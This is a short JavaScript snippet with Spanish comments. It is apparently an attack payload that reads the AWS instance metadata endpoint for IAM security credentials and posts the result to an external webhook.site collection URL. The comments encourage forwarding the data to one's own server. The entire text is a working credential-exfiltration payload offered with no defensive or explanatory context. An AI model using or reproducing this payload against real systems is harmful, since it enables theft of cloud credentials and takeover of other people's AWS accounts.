fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(response => response.text())
  .then(data => {
    console.log(data); // Procesar la respuesta como desees
    // O redirigirla a tu propio servidor
    fetch('https://webhook.site/34738be1-dc92-4167-bfe2-af99b704d0be/read', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ metadata: data })
    });
  })
  .catch(error => console.error('Error al acceder a la metadata de AWS:', error));
